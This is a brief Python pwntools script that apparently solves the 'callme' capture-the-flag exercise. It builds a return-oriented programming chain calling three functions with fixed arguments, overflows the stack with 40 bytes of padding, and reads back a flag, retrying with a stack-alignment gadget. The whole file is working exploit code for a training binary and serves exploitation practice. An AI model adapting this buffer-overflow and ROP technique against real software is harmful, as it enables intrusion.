from pwn import *

context.binary = "./callme"
elf = ELF("./callme")

def exploit(padding = False):
  p = process()
  rop = ROP(elf)
  if padding:
    rop.raw(rop.ret)
  rop.callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
  rop.callme_two(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
  rop.callme_three(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)

  print(f"ROP chain:\n{rop.dump()}")

  offset = 40
  payload = b"A" * offset
  payload += rop.chain()

  print(f"Payload: {payload}")

  p.sendline(payload)
  return p.recvline_regex(rb".*{.*}.*").decode('ascii')

try:
  log.success(exploit())
except EOFError:
  log.failure("Stack alignment is needed")
  log.success(exploit(True))